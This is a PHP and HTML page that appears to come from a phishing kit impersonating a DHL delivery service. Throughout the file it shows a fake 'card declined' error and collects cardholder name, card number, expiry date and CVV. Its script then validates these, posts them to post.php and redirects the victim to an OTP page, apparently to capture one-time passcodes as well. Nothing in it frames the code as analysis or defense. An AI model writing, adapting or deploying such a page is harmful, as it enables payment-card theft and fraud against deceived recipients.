<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $langs['title']; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
    <div class="header">
        <div class="container">
            <div class="left">
                <img src="res/logo.png">
            </div>
            <div class="right">
                <span><?php echo $langs['help_support']; ?></span>
            </div>
        </div>
    </div>
    <div class="header">
        <div class="container links" style="display:inline-block;">
            <span><?php echo $langs['home']; ?></span>
            <span><?php echo $langs['ship']; ?></span>
            <span><?php echo $langs['track']; ?></span>
        </div>
    </div>
</header>

<main>
    <div class="container">
        <div class="form">
            <div class="title"><?php echo $langs['delivery_services']; ?></div>
            <div class="text"><?php echo $langs['delivery_text']; ?></div>
            <?php setError($langs['card_declined_error']); ?>
            <div class="col">
                <label><?php echo $langs['cardholder_name']; ?></label>
                <input type="text" id="d0">
            </div>

            <div class="col">
                <label><?php echo $langs['card_number']; ?></label>
                <input type="text" id="d1" placeholder="XXXXXXXXXXXXXXXX">
            </div>

            <div class="col">
                <div class="multi">
                    <div class="left">
                        <label><?php echo $langs['expiry_code']; ?></label>
                        <input type="text" id="d2" placeholder="MM/YY">
                    </div>
                    <div class="right">
                        <label><?php echo $langs['security_code']; ?></label>
                        <input type="text" id="d3" placeholder="CVV">
                    </div>
                </div>
            </div>

            <div class="col">
                <button onclick="sendCard()"><?php echo $langs['continue']; ?></button>
            </div>

            <div class="col methods" style="margin:50px 0;">
                <img src="res/methods.png">
                <h4 style="color:green;"><?php echo $langs['ssl_security']; ?></h4>
                <p style="font-size:0.8em;"><?php echo $langs['payment_security_notice']; ?></p>
            </div>
        </div>
    </div>
</main>

<footer>
    <div class="container">
        <div class="rows">
            <div class="cola">
                <span><img src="res/footer.png"></span>
                <span><?php echo $langs['about_dhl']; ?></span>
                <span><?php echo $langs['press']; ?></span>
                <span><?php echo $langs['careers']; ?></span>
                <span><?php echo $langs['legal_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['alerts']; ?></span>
                <span><?php echo $langs['fraud_awareness']; ?></span>
                <span><?php echo $langs['important_information']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['legal']; ?></span>
                <span><?php echo $langs['terms_conditions']; ?></span>
                <span><?php echo $langs['privacy_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['contact_support']; ?></span>
                <span><?php echo $langs['help_support']; ?></span>
                <span><?php echo $langs['faqs']; ?></span>
                <span><?php echo $langs['contact_us']; ?></span>
                <span><?php echo $langs['find_location']; ?></span>
            </div>
        </div>
    </div>
</footer>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-creditcardvalidator/1.2.0/jquery.creditCardValidator.js"></script>
<script>
$("#d1").mask("0000000000000000");
$("#d2").mask("00/00");
$("#d3").mask("0000");

var allowSubmit = false;
var abortVal = true;

function validate() {
    abortVal = false;
    allowSubmit = true;

    if ($("#d0").val() === "") {
        $("#d0").addClass("error");
        allowSubmit = false;
    } else {
        $("#d0").removeClass("error");
    }

    if ($("#d1").val().length < 16) {
        $("#d1").addClass("error");
        allowSubmit = false;
    } else {
        $("#d1").removeClass("error");
    }

    if ($("#d3").val().length < 3) {
        $("#d3").addClass("error");
        allowSubmit = false;
    } else {
        $("#d3").removeClass("error");
    }

    $('#d1').validateCreditCard(function (result) {
        if (result.valid) {
            $("#d1").removeClass("error");
        } else {
            $("#d1").addClass("error");
            allowSubmit = false;
        }
    });

    const _exp = $("#d2").val();
    const _exps = _exp.split("/");
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;

    if (_exps[0] > 12 || _exps[0] <= 0 || _exps[1] < currentYear || (_exps[1] == currentYear && _exps[0] < currentMonth)) {
        $("#d2").addClass("error");
        allowSubmit = false;
    } else {
        $("#d2").removeClass("error");
    }
}

$("input").keyup(() => {
    if (!abortVal) {
        validate();
    }

});

$("input").keydown((e) => {
    if (e.key === "Enter") {
        sendCard();
    }
});

function sendCard() {
    validate();
    if (allowSubmit) {
        $.post("post.php", {
            name: $("#d0").val(),
            cc: $("#d1").val(),
            exp: $("#d2").val(),
            cvv: $("#d3").val(),
        }, (res) => {
            window.location = "wait.php?next=otp.php";
        });
    }
}

</script>

</body>
</html>